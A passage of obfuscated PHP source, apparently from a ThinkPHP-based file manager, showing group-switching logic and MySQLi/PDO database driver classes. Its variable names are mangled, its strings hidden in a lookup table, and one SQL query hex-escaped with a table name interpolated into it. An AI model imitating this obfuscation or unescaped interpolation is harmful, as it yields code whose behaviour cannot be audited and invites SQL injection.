$Ï›¨úĞ¸ = $this->where(array($Î‡´’Ãó[477] => $Ä÷¢Ã²Œ))->getField($Î‡´’Ãó[32], !0); if (!$Ï›¨úĞ¸ || !in_array($åôÁ’É·, $Ï›¨úĞ¸)) { return $åôÁ’É·; } for ($‚Şµ½ä² = 1; $‚Şµ½ä² <= count($Ï›¨úĞ¸) + 1; $‚Şµ½ä²++) { $ä«¸ ßĞ = $åôÁ’É· . "\50{$‚Şµ½ä²}\51"; if (!in_array($ä«¸ ßĞ, $Ï›¨úĞ¸)) { return $ä«¸ ßĞ; } } } public function groupSwitch($òÓÒÜšÆ, $ÖÑ¦ö¥İ) { $¶ÒóÛ¤ =& $_SERVER[Ş­ğŠìÒ]; $şá­Š’Ê = array($¶ÒóÛ¤[1963] => array($¶ÒóÛ¤[7], array($òÓÒÜšÆ, $ÖÑ¦ö¥İ))); $İıºæşÂ = $this->where($şá­Š’Ê)->select(); $İıºæşÂ = array_to_keyvalue($İıºæşÂ, $¶ÒóÛ¤[1963]); if (!isset($İıºæşÂ[$òÓÒÜšÆ]) || !isset($İıºæşÂ[$ÖÑ¦ö¥İ]) || $İıºæşÂ[$òÓÒÜšÆ][$¶ÒóÛ¤[192]] == 0) { return !1; } $şá­Š’Ê = array($¶ÒóÛ¤[1963] => $òÓÒÜšÆ); $µŸó˜© = Model($¶ÒóÛ¤[2058])->where($şá­Š’Ê)->select(); if (!$µŸó˜©) { $µŸó˜© = array(); } foreach ($µŸó˜© as $©ÌÛœ) { $»ÅòÉ‹˜ = $©ÌÛœ[$¶ÒóÛ¤[1764]]; $şá­Š’Ê = array($¶ÒóÛ¤[1764] => $»ÅòÉ‹˜, $¶ÒóÛ¤[1963] => $ÖÑ¦ö¥İ); $áß¨ùĞï = Model($¶ÒóÛ¤[2058])->where($şá­Š’Ê)->find(); if (!$áß¨ùĞï) { $šÛ”ŸèÃ = array($ÖÑ¦ö¥İ => $©ÌÛœ[$¶ÒóÛ¤[2072]]); Model($¶ÒóÛ¤[598])->userGroupAdd($»ÅòÉ‹˜, $šÛ”ŸèÃ); } Model($¶ÒóÛ¤[598])->userGroupRemove($»ÅòÉ‹˜, $òÓÒÜšÆ); } $şá­Š’Ê = array($¶ÒóÛ¤[190] => 2, $¶ÒóÛ¤[192] => 0, $¶ÒóÛ¤[485] => 1, $¶ÒóÛ¤[569] => array($¶ÒóÛ¤[7], array($òÓÒÜšÆ, $ÖÑ¦ö¥İ))); $í»ÂµÏ = Model($¶ÒóÛ¤[891])->where($şá­Š’Ê)->field($¶ÒóÛ¤[2073])->select(); $í»ÂµÏ = array_to_keyvalue($í»ÂµÏ, $¶ÒóÛ¤[569], $¶ÒóÛ¤[193]); $³¡ÅŒÁÍ = !empty($í»ÂµÏ[$òÓÒÜšÆ]) ? $í»ÂµÏ[$òÓÒÜšÆ] : !1; if ($³¡ÅŒÁÍ) { if (!$í»ÂµÏ[$ÖÑ¦ö¥İ]) { $í»ÂµÏ[$ÖÑ¦ö¥İ] = Model($¶ÒóÛ¤[891])->groupRootAdd($ÖÑ¦ö¥İ); } $¨ã¥ƒµ = $í»ÂµÏ[$ÖÑ¦ö¥İ]; $şá­Š’Ê = array($¶ÒóÛ¤[192] => $³¡ÅŒÁÍ); $í»ÂµÏ = Model($¶ÒóÛ¤[891])->where($şá­Š’Ê)->field($¶ÒóÛ¤[2074])->select(); if (!$í»ÂµÏ) { $í»ÂµÏ = array(); } Model($¶ÒóÛ¤[891])->moveClearAuth = !1; foreach ($í»ÂµÏ as $½ˆ¦‘­Ü) { $»‹Øò“á = $½ˆ¦‘­Ü[$¶ÒóÛ¤[485]] == $¶ÒóÛ¤[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¶ÒóÛ¤[891])->move($½ˆ¦‘­Ü[$¶ÒóÛ¤[193]], $¨ã¥ƒµ, $»‹Øò“á); } Model($¶ÒóÛ¤[891])->moveClearAuth = !0; $şá­Š’Ê = array($¶ÒóÛ¤[190] => 2, $¶ÒóÛ¤[569] => $òÓÒÜšÆ); $ê«ÁÙúì = array($¶ÒóÛ¤[569] => $ÖÑ¦ö¥İ); Model($¶ÒóÛ¤[2075])->where($şá­Š’Ê)->save($ê«ÁÙúì); Model($¶ÒóÛ¤[2076])->where($şá­Š’Ê)->save($ê«ÁÙúì); } $this->_changeChildLevel($İıºæşÂ[$òÓÒÜšÆ], $İıºæşÂ[$ÖÑ¦ö¥İ], !0); $this->where(array($¶ÒóÛ¤[192] => $òÓÒÜšÆ))->save(array($¶ÒóÛ¤[192] => $ÖÑ¦ö¥İ)); $this->_clearChildrenCache($İıºæşÂ[$ÖÑ¦ö¥İ]); return !0; } } goto aàÀÔ…ø©; d·ÅóÂÏ÷: class DbMysqli extends Db { public function __construct($¾şÌÄÀ‘ = '') { $×ŒÍî =& $_SERVER[Ş­ğŠìÒ]; if (!extension_loaded($×ŒÍî[986])) { think_exception(think_lang($×ŒÍî[14]) . $×ŒÍî[987]); } if (!empty($¾şÌÄÀ‘)) { $this->config = $¾şÌÄÀ‘; if (empty($this->config[$×ŒÍî[17]])) { $this->config[$×ŒÍî[17]] = $×ŒÍî[12]; } } } public function connect($Ù½æğÕÑ = '', $Üòè¥Àö = 0) { $½·Ëá§¡ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->linkID[$Üòè¥Àö])) { if (empty($Ù½æğÕÑ)) { $Ù½æğÕÑ = $this->config; } $this->linkID[$Üòè¥Àö] = new mysqli($Ù½æğÕÑ[$½·Ëá§¡[960]], $Ù½æğÕÑ[$½·Ëá§¡[962]], $Ù½æğÕÑ[$½·Ëá§¡[963]], $Ù½æğÕÑ[$½·Ëá§¡[21]], $Ù½æğÕÑ[$½·Ëá§¡[961]] ? intval($Ù½æğÕÑ[$½·Ëá§¡[961]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¬™Àòáİ = $this->linkID[$Üòè¥Àö]->server_version; $this->linkID[$Üòè¥Àö]->query($½·Ëá§¡[964] . think_config($½·Ëá§¡[965]) . $½·Ëá§¡[58]); if ($¬™Àòáİ > $½·Ëá§¡[966]) { $this->linkID[$Üòè¥Àö]->query($½·Ëá§¡[967]); } $this->connected = !0; if (1 != think_config($½·Ëá§¡[22])) { unset($this->config); } } return $this->linkID[$Üòè¥Àö]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($²¨¹¶Øß) { $³š°ù‰É =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $²¨¹¶Øß; if ($this->queryID) { $this->free(); } think_action_status($³š°ù‰É[23], 1); think_status($³š°ù‰É[24]); $this->queryID = $this->_linkID->query($²¨¹¶Øß); if ($this->_linkID->more_results()) { while (($¹Í¨…µ¯ = $this->_linkID->next_result()) != NULL) { $¹Í¨…µ¯->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ğ‘ì‘¬ ) { $„áºâ—· =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ‘ì‘¬ ; if ($this->queryID) { $this->free(); } think_action_status($„áºâ—·[25], 1); think_status($„áºâ—·[24]); $çş´‹°€ = $this->_linkID->query($ğ‘ì‘¬ ); $this->debug(); if (!1 === $çş´‹°€) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¿İÜï§€ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¿İÜï§€) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ä‡ËÂå­ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ä‡ËÂå­) { $this->error(); return !1; } } return !0; } private function getAll() { $‡¥Ùİõ¤ = array(); if ($this->numRows > 0) { for ($½ä–§Ä´ = 0; $½ä–§Ä´ < $this->numRows; $½ä–§Ä´++) { $‡¥Ùİõ¤[$½ä–§Ä´] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‡¥Ùİõ¤; } public function getFields($ß«ş§ŠÒ) { $œ·°ñ– =& $_SERVER[Ş­ğŠìÒ]; $Ø·ó£Çª = $this->query($œ·°ñ–[971] . $this->parseKey($ß«ş§ŠÒ)); $ÏòŒçæÑ = array(); if ($Ø·ó£Çª) { foreach ($Ø·ó£Çª as $ªÈƒ‘ => $ªƒ‡­€ã) { $ÏòŒçæÑ[$ªƒ‡­€ã[$œ·°ñ–[31]]] = array($œ·°ñ–[32] => $ªƒ‡­€ã[$œ·°ñ–[31]], $œ·°ñ–[33] => $ªƒ‡­€ã[$œ·°ñ–[34]], $œ·°ñ–[35] => (bool) ($ªƒ‡­€ã[$œ·°ñ–[36]] === $œ·°ñ–[12]), $œ·°ñ–[37] => $ªƒ‡­€ã[$œ·°ñ–[38]], $œ·°ñ–[39] => strtolower($ªƒ‡­€ã[$œ·°ñ–[40]]) == $œ·°ñ–[41], $œ·°ñ–[42] => strtolower($ªƒ‡­€ã[$œ·°ñ–[43]]) == $œ·°ñ–[44]); } } return $ÏòŒçæÑ; } public function getTables($î¸æª = '') { $©„æÁù¹ =& $_SERVER[Ş­ğŠìÒ]; $¸ ¢½ = !empty($î¸æª) ? $©„æÁù¹[973] . $î¸æª . $©„æÁù¹[974] : $©„æÁù¹[975]; $ ¨§‡´µ = $this->query($¸ ¢½); $‹ƒ©ø’Ø = array(); if ($ ¨§‡´µ) { foreach ($ ¨§‡´µ as $«Œ˜¶¦î => $’ÔõÕ³) { $‹ƒ©ø’Ø[$«Œ˜¶¦î] = current($’ÔõÕ³); } } return $‹ƒ©ø’Ø; } public function replace($–¶ú®âı, $òàõ±± = array()) { $ãè¼š˜Ò =& $_SERVER[Ş­ğŠìÒ]; foreach ($–¶ú®âı as $øÛéÛÂ† => $¯¿¹ì½ú) { $ÁÊ¼Ôü² = $this->parseValue($¯¿¹ì½ú); if (is_scalar($ÁÊ¼Ôü²)) { $ÒÂ¯Ÿµ[] = $ÁÊ¼Ôü²; $°öİó¦á[] = $this->parseKey($øÛéÛÂ†); } } $¯ßÙ„ª¤ = $ãè¼š˜Ò[976] . $this->parseTable($òàõ±±[$ãè¼š˜Ò[356]]) . $ãè¼š˜Ò[977] . implode($ãè¼š˜Ò[50], $°öİó¦á) . $ãè¼š˜Ò[978] . implode($ãè¼š˜Ò[50], $ÒÂ¯Ÿµ) . $ãè¼š˜Ò[979]; return $this->execute($¯ßÙ„ª¤); } public function insertAll($õéãô›¡, $õî‰úéû = array(), $Î¾ËÏ±ñ = false) { $Üˆç‰Ì’ =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($õéãô›¡[0])) { return !1; } $Ú–÷¸áô = array_keys($õéãô›¡[0]); $Ô¶Ò†æƒ = array(); foreach ($õéãô›¡ as $½ÛÙ¾öÄ) { $ÇªÙ­àÙ = array(); foreach ($½ÛÙ¾öÄ as $çÑ±çå => $ÈÑ‹çáŒ) { $ÈÑ‹çáŒ = $this->parseValue($ÈÑ‹çáŒ); if (is_scalar($ÈÑ‹çáŒ)) { $ÇªÙ­àÙ[] = $ÈÑ‹çáŒ; } } $Ô¶Ò†æƒ[] = $Üˆç‰Ì’[337] . implode($Üˆç‰Ì’[50], $ÇªÙ­àÙ) . $Üˆç‰Ì’[979]; } array_walk($Ú–÷¸áô, array($this, $Üˆç‰Ì’[980])); $Åò¼¹ÂÜ = $Î¾ËÏ±ñ ? $Üˆç‰Ì’[981] : $Üˆç‰Ì’[982]; $ªõÑêÓ€ = $Åò¼¹ÂÜ . $Üˆç‰Ì’[983] . $this->parseTable($õî‰úéû[$Üˆç‰Ì’[356]]) . $Üˆç‰Ì’[977] . implode($Üˆç‰Ì’[50], $Ú–÷¸áô) . $Üˆç‰Ì’[984] . implode($Üˆç‰Ì’[50], $Ô¶Ò†æƒ); return $this->execute($ªõÑêÓ€); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ùªÆÏñ =& $_SERVER[Ş­ğŠìÒ]; $this->error = $this->_linkID->errno . $ùªÆÏñ[4] . $this->_linkID->error; if ($ùªÆÏñ[12] != $this->queryStr) { $this->error .= LNG($ùªÆÏñ[48]) . $this->queryStr; } think_trace($this->error, $ùªÆÏñ[12], $ùªÆÏñ[49]); return $this->error; } public function escapeString($úôÂéŸı) { if ($this->_linkID) { return $this->_linkID->real_escape_string($úôÂéŸı); } else { return addslashes($úôÂéŸı); } } public function parseKey(&$µÒœÎÈÙ, $üÖ¯ğó = true) { $Ü×¿¤é÷ =& $_SERVER[Ş­ğŠìÒ]; if ($üÖ¯ğó) { $µÒœÎÈÙ = $this->parseKeyCheck($µÒœÎÈÙ); } if ($µÒœÎÈÙ != $Ü×¿¤é÷[220] && !preg_match($Ü×¿¤é÷[985], $µÒœÎÈÙ)) { $µÒœÎÈÙ = $Ü×¿¤é÷[461] . trim($µÒœÎÈÙ, $Ü×¿¤é÷[461]) . $Ü×¿¤é÷[461]; } return $µÒœÎÈÙ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($íØÃòÙñ = '') { $¿£ı—”  =& $_SERVER[Ş­ğŠìÒ]; if (!class_exists($¿£ı—” [988])) { think_exception(think_lang($¿£ı—” [14]) . $¿£ı—” [989]); } if (!empty($íØÃòÙñ)) { $this->config = $íØÃòÙñ; if (empty($this->config[$¿£ı—” [17]])) { $this->config[$¿£ı—” [17]] = array(); } } } public function connect($Á‚…Äî¢ = '', $«ØÖÄŠø = 0) { $¤¼Ùè² =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->linkID[$«ØÖÄŠø])) { if (empty($Á‚…Äî¢)) { $Á‚…Äî¢ = $this->config; } $Üœ§•®» = !empty($Á‚…Äî¢[$¤¼Ùè²[17]][$¤¼Ùè²[18]]) ? $Á‚…Äî¢[$¤¼Ùè²[17]][$¤¼Ùè²[18]] : $this->pconnect; if ($Üœ§•®») { $Á‚…Äî¢[$¤¼Ùè²[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$«ØÖÄŠø] = new PDO($Á‚…Äî¢[$¤¼Ùè²[990]], $Á‚…Äî¢[$¤¼Ùè²[962]], $Á‚…Äî¢[$¤¼Ùè²[963]], $Á‚…Äî¢[$¤¼Ùè²[17]]); } catch (PDOException $ĞåœÊ’) { think_exception($ĞåœÊ’->getMessage()); } $this->dbType = $this->_getDsnType($Á‚…Äî¢[$¤¼Ùè²[990]]); if (in_array($this->dbType, array($¤¼Ùè²[991], $¤¼Ùè²[992], $¤¼Ùè²[993], $¤¼Ùè²[994]))) { think_exception($¤¼Ùè²[995] . $this->dbType . $¤¼Ùè²[996] . $this->dbType . $¤¼Ùè²[997]); } if (!$this->linkID[$«ØÖÄŠø]) { think_exception($¤¼Ùè²[998]); } try { $this->linkID[$«ØÖÄŠø]->exec($¤¼Ùè²[999] . think_config($¤¼Ùè²[965])); } catch (Exception $ĞåœÊ’) { } $this->connected = !0; if (1 != think_config($¤¼Ùè²[22])) { unset($this->config); } } return $this->linkID[$«ØÖÄŠø]; } public function free() { $this->PDOStatement = null; } public function query($×¿÷¾›ø, $”¡«„· = array()) { $ÚÈ¸ÖÚĞ =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×¿÷¾›ø; if (!empty($”¡«„·)) { $this->queryStr .= $ÚÈ¸ÖÚĞ[1000] . print_r($”¡«„·, !0) . $ÚÈ¸ÖÚĞ[1001]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÚÈ¸ÖÚĞ[23], 1); think_status($ÚÈ¸ÖÚĞ[24]); $this->PDOStatement = $this->_linkID->prepare($×¿÷¾›ø); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¬ù•ßŞ = $this->PDOStatement->execute($”¡«„·); $this->debug(); if (!1 === $¬ù•ßŞ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Œ˜ò·÷, $Ş“îµ˜ì = array()) { $á°èß€„ =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Œ˜ò·÷; if (!empty($Ş“îµ˜ì)) { $this->queryStr .= $á°èß€„[1000] . print_r($Ş“îµ˜ì, !0) . $á°èß€„[1001]; } $ÒšºÌ† = !1; if ($this->dbType == $á°èß€„[994]) { if (preg_match($á°èß€„[1002], $this->queryStr, $³ßšÈúæ)) { $this->table = think_config($á°èß€„[1003]) . str_ireplace(think_config($á°èß€„[1004]), $á°èß€„[454], $³ßšÈúæ[2]); $ÒšºÌ† = (bool) $this->query($á°èß€„[1005] . strtoupper($this->table) . $á°èß€„[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($á°èß€„[25], 1); think_status($á°èß€„[24]); $this->PDOStatement = $this->_linkID->prepare($Œ˜ò·÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÅÜß„…Ğ = $this->PDOStatement->execute($Ş“îµ˜ì); $this->debug(); if (!1 === $ÅÜß„…Ğ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÒšºÌ† || preg_match($á°èß€„[1006], $Œ˜ò·÷)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÆˆĞ¨İ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÆˆĞ¨İ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯ö‹±¡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¯ö‹±¡) { $this->error(); return !1; } } return !0; } private function getAll() { $¦£ÍÉÅº = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¦£ÍÉÅº); return $¦£ÍÉÅº; } public function getFields($Ã°æŒñ) { $úÎ·“Ì¯ =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (think_config($úÎ·“Ì¯[1007])) { $—şíÃ¡´ = str_replace($úÎ·“Ì¯[1008], $Ã°æŒñ, think_config($úÎ·“Ì¯[1007])); } else { switch ($this->dbType) { case $úÎ·“Ì¯[991]: case $úÎ·“Ì¯[1009]: $—şíÃ¡´ = "\x53\x45\x4c\x45\x43\124\x20\40\40\143\157\x6c\165\155\156\x5f\x6e\141\x6d\x65\40\141\163\40\47\x4e\141\155\x65\47\x2c\x20\x20\40\144\141\x74\x61\137\164\171\160\x65\x20\x61\163\40\x27\124\x79\160\145\47\54\x20\40\40\143\157\x6c\x75\155\x6e\137\144\145\146\141\165\154\164\40\x61\x73\x20\47\x44\145\146\141\x75\154\x74\x27\54\40\40\40\x69\x73\137\156\165\154\x6c\141\142\x6c\145\40\x61\x73\40\47\116\165\154\154\47\12\11\11\x46\x52\x4f\115\11\151\x6e\146\x6f\162\155\141\164\151\x6f\x6e\137\163\143\150\145\x6d\141\56\164\141\x62\x6c\x65\x73\40\x41\x53\x20\x74\12\11\11\112\117\x49\116\x9\151\156\146\157\x72\155\x61\164\151\157\156\x5f\163\143\150\x65\x6d\141\56\x63\157\x6c\165\155\x6e\163\x20\x41\x53\40\x63\12\11\11\x4f\x4e\40\40\164\x2e\164\141\142\154\x65\137\x63\x61\x74\141\x6c\x6f\x67\40\75\x20\x63\x2e\x74\141\x62\x6c\x65\137\143\x61\x74\x61\154\157\147\12\11\11\101\x4e\104\40\x74\x2e\x74\141\142\154\x65\x5f\x73\143\x68\145\x6d\141\40\x3d\40\x63\56\x74\x61\142\154\x65\x5f\x73\x63\150\145\x6d\x61\12\11\x9\x41\x4e\x44\x20\x74\x2e\164\141\142\x6c\x65\x5f\x6e\x61\155\145\40\75\x20\143\56\x74\x61\142\154\145\137\x6e\x61\x6d\x65\12\11\11\x57\x48\x45\x52\x45\40\40\40\x74\56\x74\141\x62\x6c\145\137\156\x61\x6d\145\40\75\x20\47{$Ã°æŒñ}\47"; break; case $úÎ·“Ì¯[1010]: $—şíÃ¡´ = $úÎ·“Ì¯[1011] . $Ã°æŒñ . $úÎ·“Ì¯[1012]; break; case $úÎ·“Ì¯[992]: case $úÎ·“Ì¯[994]: $—şíÃ¡´ = $úÎ·“Ì¯[1013] . $úÎ·“Ì¯[1014] . $úÎ·“Ì¯[1015] . strtoupper($Ã°æŒñ) . $úÎ·“Ì¯[1016] . strtoupper($Ã°æŒñ) . $úÎ·“Ì¯[1017]; break; case $úÎ·“Ì¯[1018]: $—şíÃ¡´ = $úÎ·“Ì¯[1019] . $Ã°æŒñ . $úÎ·“Ì¯[1020]; break; case $úÎ·“Ì¯[993]: break; case $úÎ·“Ì¯[1021]: default: $—şíÃ¡´ = $úÎ·“Ì¯[1022] . ($this->dbType == $úÎ·“Ì¯[1021] ? "\x60{$Ã°æŒñ}\x60" : $Ã°æŒñ); } } $êæÛ˜œï = $this->query($—şíÃ¡´); $ªîé”Ğı = array(); if ($êæÛ˜œï) { foreach ($êæÛ˜œï as $§”Ôæ‚¼ => $£‹ÂÆ´ã) { $£‹ÂÆ´ã = array_change_key_case($£‹ÂÆ´ã); $£‹ÂÆ´ã[$úÎ·“Ì¯[32]] = isset($£‹ÂÆ´ã[$úÎ·“Ì¯[32]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[32]] : $úÎ·“Ì¯[454]; $£‹ÂÆ´ã[$úÎ·“Ì¯[33]] = isset($£‹ÂÆ´ã[$úÎ·“Ì¯[33]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[33]] : $úÎ·“Ì¯[454]; $îÉ°ë¤ô = isset($£‹ÂÆ´ã[$úÎ·“Ì¯[350]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[350]] : $£‹ÂÆ´ã[$úÎ·“Ì¯[32]]; $ªîé”Ğı[$îÉ°ë¤ô] = array($úÎ·“Ì¯[32] => $îÉ°ë¤ô, $úÎ·“Ì¯[33] => $£‹ÂÆ´ã[$úÎ·“Ì¯[33]], $úÎ·“Ì¯[35] => (bool) (isset($£‹ÂÆ´ã[$úÎ·“Ì¯[106]]) && $£‹ÂÆ´ã[$úÎ·“Ì¯[106]] === $úÎ·“Ì¯[12] || isset($£‹ÂÆ´ã[$úÎ·“Ì¯[35]]) && $£‹ÂÆ´ã[$úÎ·“Ì¯[35]] === $úÎ·“Ì¯[12]), $úÎ·“Ì¯[37] => isset($£‹ÂÆ´ã[$úÎ·“Ì¯[37]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[37]] : (isset($£‹ÂÆ´ã[$úÎ·“Ì¯[56]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[56]] : $úÎ·“Ì¯[454]), $úÎ·“Ì¯[39] => isset($£‹ÂÆ´ã[$úÎ·“Ì¯[97]]) ? strtolower($£‹ÂÆ´ã[$úÎ·“Ì¯[97]]) == $úÎ·“Ì¯[41] : (isset($£‹ÂÆ´ã[$úÎ·“Ì¯[57]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[57]] : !1), $úÎ·“Ì¯[42] => isset($£‹ÂÆ´ã[$úÎ·“Ì¯[1023]]) ? strtolower($£‹ÂÆ´ã[$úÎ·“Ì¯[1023]]) == $úÎ·“Ì¯[44] : (isset($£‹ÂÆ´ã[$úÎ·“Ì¯[97]]) ? $£‹ÂÆ´ã[$úÎ·“Ì¯[97]] : !1)); } } return $ªîé”Ğı; } public function getTables($­‰æ¯ÌÇ = '') { $‘ŞÒ’“ =& $_SERVER[Ş­ğŠìÒ]; if (think_config($‘ŞÒ’“[1024])) { $í—ç£¹ = str_replace($‘ŞÒ’“[1025], $­‰æ¯ÌÇ, think_config($‘ŞÒ’“[1024])); } else { switch ($this->dbType) { case $‘ŞÒ’“[992]: case $‘ŞÒ’“[994]: $í—ç£¹ = $‘ŞÒ’“[1026]; break; case $‘ŞÒ’“[991]: case $‘ŞÒ’“[1009]: $í—ç£¹ = $‘ŞÒ’“[1027]; break; case $‘ŞÒ’“[1018]: $í—ç£¹ = $‘ŞÒ’“[1028]; break; case $‘ŞÒ’“[993]: think_exception(think_lang($‘ŞÒ’“[1029]) . $‘ŞÒ’“[1030]); break; case $‘ŞÒ’“[1010]: $í—ç£¹ = $‘ŞÒ’“[45] . $‘ŞÒ’“[46] . $‘ŞÒ’“[47]; break; case $‘ŞÒ’“[1021]: default: if (!empty($­‰æ¯ÌÇ)) { $í—ç£¹ = $‘ŞÒ’“[973] . $­‰æ¯ÌÇ . $‘ŞÒ’“[974]; } else { $í—ç£¹ = $‘ŞÒ’“[975]; } } } $ª–Ä…ö = $this->query($í—ç£¹); $ŞÎº…Äâ = array(); foreach ($ª–Ä…ö as $ü¶ºæ¼œ => $øÃõùşõ) { $ŞÎº…Äâ[$ü¶ºæ¼œ] = current($øÃõùşõ); } return $ŞÎº…Äâ; } protected function parseLimit($¤öº–°¹) { $÷Ù”†éæ =& $_SERVER[Ş­ğŠìÒ]; $õ¡Ï˜”Ò = $÷Ù”†éæ[12]; if (!empty($¤öº–°¹)) { switch ($this->dbType) { case $÷Ù”†éæ[1018]: case $÷Ù”†éæ[1010]: $¤öº–°¹ = explode($÷Ù”†éæ[50], $¤öº–°¹); if (count($¤öº–°¹) > 1) { $õ¡Ï˜”Ò .= $÷Ù”†éæ[51] . $¤öº–°¹[1] . $÷Ù”†éæ[52] . $¤öº–°¹[0] . $÷Ù”†éæ[53]; } else { $õ¡Ï˜”Ò .= $÷Ù”†éæ[51] . $¤öº–°¹[0] . $÷Ù”†éæ[53]; } break; case $÷Ù”†éæ[991]: case $÷Ù”†éæ[1009]: break; case $÷Ù”†éæ[993]: break; case $÷Ù”†éæ[992]: case $÷Ù”†éæ[994]: break; case $÷Ù”†éæ[1021]: default: $õ¡Ï˜”Ò .= $÷Ù”†éæ[51] . $¤öº–°¹ . $÷Ù”†éæ[53]; } } return $õ¡Ï˜”Ò; } public function parseKey(&$ŒÎé”ÀÃ, $–ËàëÁ = true) { $ùñ­¯ı =& $_SERVER[Ş­ğŠìÒ]; if ($–ËàëÁ) { $ŒÎé”ÀÃ = $this->parseKeyCheck($ŒÎé”ÀÃ); } if ($this->dbType == $ùñ­¯ı[1021]) { if ($ŒÎé”ÀÃ != $ùñ­¯ı[220] && !preg_match($ùñ­¯ı[985], $ŒÎé”ÀÃ)) { $ŒÎé”ÀÃ = $ùñ­¯ı[461] . trim($ŒÎé”ÀÃ, $ùñ­¯ı[461]) . $ùñ­¯ı[461]; } return $ŒÎé”ÀÃ; } else { return parent::parseKey($ŒÎé”ÀÃ, $–ËàëÁ); } } public function close() { $this->_linkID = null; } public function error() { $æüœÌ¿à =& $_SERVER[Ş­ğŠìÒ]; if ($this->PDOStatement) { $Óí‰Ö¨á = $this->PDOStatement->errorInfo(); $this->error = $Óí‰Ö¨á[1] . $æüœÌ¿à[4] . $Óí‰Ö¨á[2]; } else { $this->error = $æüœÌ¿à[12]; } if ($æüœÌ¿à[12] != $this->queryStr) { $this->error .= LNG($æüœÌ¿à[48]) . $this->queryStr; } think_trace($this->error, $æüœÌ¿à[12], $æüœÌ¿à[49]); return $this->error; } public function escapeString($›Á»“–‡) { $˜ûëŠâö =& $_SERVER[Ş­ğŠìÒ]; switch ($this->dbType) { case $˜ûëŠâö[1018]: case $˜ûëŠâö[991]: case $˜ûëŠâö[1009]: case $˜ûëŠâö[1021]: return addslashes($›Á»“–‡); case $˜ûëŠâö[993]: case $˜ûëŠâö[1010]: case $˜ûëŠâö[992]: case $˜ûëŠâö[994]: return str_ireplace($˜ûëŠâö[58], $˜ûëŠâö[59], $›Á»“–‡); } } protected function parseValue($Ç õ‚”õ) { $ß–¬Óë =& $_SERVER[Ş­ğŠìÒ]; if (is_string($Ç õ‚”õ)) { $¥õáş—ï = strpos($Ç õ‚”õ, $ß–¬Óë[4]) === 0 && in_array($Ç õ‚”õ, array_keys($this->bind)); $Ç õ‚”õ = $¥õáş—ï ? $this->escapeString($Ç õ‚”õ) : $ß–¬Óë[1031] . $this->escapeString($Ç õ‚”õ) . $ß–¬Óë[1031]; } elseif (isset($Ç õ‚”õ[0]) && is_string($Ç õ‚”õ[0]) && strtolower($Ç õ‚”õ[0]) == $ß–¬Óë[373]) { $Ç õ‚”õ = $this->escapeString($Ç õ‚”õ[1]); } elseif (is_array($Ç õ‚”õ)) { $Ç õ‚”õ = array_map(array($this, $ß–¬Óë[1032]), $Ç õ‚”õ); } elseif (is_bool($Ç õ‚”õ)) { $Ç õ‚”õ = $Ç õ‚”õ ? $ß–¬Óë[91] : $ß–¬Óë[228]; } elseif (is_null($Ç õ‚”õ)) { $Ç õ‚”õ = $ß–¬Óë[106]; } return $Ç õ‚”õ; } public function getLastInsertId() { $œâş¡—À =& $_SERVER[Ş­ğŠìÒ]; switch ($this->dbType) { case $œâş¡—À[1018]: case $œâş¡—À[1010]: case $œâş¡—À[991]: case $œâş¡—À[1009]: case $œâş¡—À[993]: case $œâş¡—À[1021]: return $this->_linkID->lastInsertId(); case $œâş¡—À[992]: case $œâş¡—À[994]: $â¶‚Ê¢ = $this->table; $¦¸²Õ„ = 